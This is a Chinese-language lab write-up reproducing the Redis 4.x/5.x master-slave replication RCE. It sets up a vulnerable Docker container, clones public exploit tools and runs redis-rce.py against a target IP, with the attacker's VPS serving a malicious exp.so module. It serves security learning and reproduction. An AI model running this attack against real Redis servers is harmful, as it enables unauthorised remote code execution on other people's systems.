# Redis基于主从复制的RCE 4.x/5.x 复现

## 复现过程：

### 拉取镜像

使用docker获取到相关环境：

```shell
docker search redis5.0    //查找镜像
docker pull damonevking/redis5.0   //获取下图中选中镜像
```

![image-20230707234604816](https://raw.githubusercontent.com/shungli923/PicGoImg/master/image-20230707234604816.png)

### 运行环境

```shell
docker run -p 6379:6379 -d damonevking/redis5.0 redis-server
```

运行后访问ip的映射端口（此处为6379），出现下图为搭建成功：

![image-20230707235342094](https://raw.githubusercontent.com/shungli923/PicGoImg/master/image-20230707235342094.png)

或者 nmap 扫描6379端口，如果开放则搭建成功：

![image-20230707235622426](https://raw.githubusercontent.com/shungli923/PicGoImg/master/image-20230707235622426.png)

### 漏洞利用

使用 github 脚本进行攻击如下图：

![image-20230707235719371](https://raw.githubusercontent.com/shungli923/PicGoImg/master/image-20230707235719371.png)

拉取到kali-Linux攻击机器中，保留其中的 exp.so 文件：

```git
git clone https://github.com/n0b0dyCN/redis-rogue-server.git
```

拉取漏洞利用文件，利用里面的 redis-rce.py 文件和上面的 exp.so 文件进行攻击：

```
git clone https://github.com/Ridter/redis-rce.git
```

启动脚本，执行攻击命令：

```
python3 redis-rce.py -r **.***.***.87（目标ip） -L ***.***.**.**（自己的vps） -f exp.so
```

利用成功：

![image-20230708012526433](https://raw.githubusercontent.com/shungli923/PicGoImg/master/image-20230708012526433.png)